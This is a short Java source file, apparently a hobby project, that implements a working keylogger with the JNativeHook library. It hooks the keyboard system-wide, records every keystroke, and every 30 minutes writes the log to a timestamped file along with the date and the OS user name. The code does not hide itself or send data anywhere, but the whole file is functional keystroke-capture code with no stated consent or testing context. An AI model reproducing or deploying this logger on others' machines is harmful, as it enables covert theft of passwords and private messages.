package keyboardlistener;

import java.io.FileNotFoundException;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.PrintWriter; 
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.Date;
import javax.swing.JOptionPane;

public class Escucha implements NativeKeyListener {
    
    String registro;
    long inicio;
    final int intervaloGuardado = 30 * 60000;
    
    public Escucha(){        
        registro = "";
        inicio = System.currentTimeMillis();  
    }
    
    public void nativeKeyPressed(NativeKeyEvent e) {
        registro += NativeKeyEvent.getKeyText(e.getKeyCode()) +" ";
        verificarLongitud();
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public void iniciarEscucha() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            JOptionPane.showMessageDialog(null, "No se pudo poner el gancho nativo. RIP");
            guardarRegistro(inicio);
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new Escucha());
        
    }
    
    public void verificarLongitud(){
        long msRegistro = inicio;
        if(System.currentTimeMillis() > (inicio + intervaloGuardado)){
            guardarRegistro(msRegistro);
            inicio = System.currentTimeMillis();
        }
        
    }
    public void guardarRegistro(long nombre){
        Date fecha = new Date();
        
        try{
        PrintWriter textFile = new PrintWriter (String.valueOf(nombre));
        textFile.println(fecha.toString());
        textFile.println("save interval: "+intervaloGuardado+"ms");
        textFile.println(System.getProperty("user.name"));
        textFile.println(registro);
        textFile.close();
        registro = "";
    }   catch (FileNotFoundException ex) {
            Logger.getLogger(Escucha.class.getName()).log(Level.SEVERE, null, ex);
            
        }
        
    }     
}
